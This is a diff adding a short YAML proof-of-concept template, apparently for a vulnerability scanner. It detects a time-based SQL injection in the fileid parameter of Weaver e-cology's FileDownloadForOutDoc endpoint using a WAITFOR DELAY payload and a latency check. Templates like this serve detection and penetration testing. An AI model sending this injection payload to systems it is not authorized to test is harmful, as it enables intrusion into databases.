@@ -1,0 +1,17 @@
+name: poc-yaml-ecology-fileid-sqli
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /weaver/weaver.file.FileDownloadForOutDoc
+      follow_redirects: false
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: fileid=1+WAITFOR+DELAY+%270:0:7%27&isFromOutImg=1
+    expression: response.status == 200 && (response.latency > 7000)
+expression: r0()
+detail:
+  author: Secur1ty0(https://github.com/Secur1ty0)
+  links:
+    - https://github.com/Secur1ty0
